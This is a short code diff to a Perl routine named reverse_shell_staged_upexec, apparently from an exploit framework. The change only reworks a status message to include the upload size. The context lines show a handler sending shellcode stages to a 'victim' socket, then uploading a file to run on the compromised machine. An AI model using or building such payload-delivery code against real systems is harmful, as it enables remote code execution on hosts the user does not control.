@@ -300,12 +300,13 @@ sub reverse_shell_staged_upexec
         $victim->send($stage);
         $stagecnt++;
     }
-    print STDERR "[*] All stages sent, uploading file\n";
-    
+
     my $upload;
     while (<X>){ $upload.=$_ }
     close (X);
-    
+
+    print STDERR "[*] All stages sent, uploading file (" . length($upload) . ")\n";
+
     $victim->send(pack('V', length($upload)));
     $victim->send($upload);
     print STDERR "[*] Executing uploaded file...\n\n";
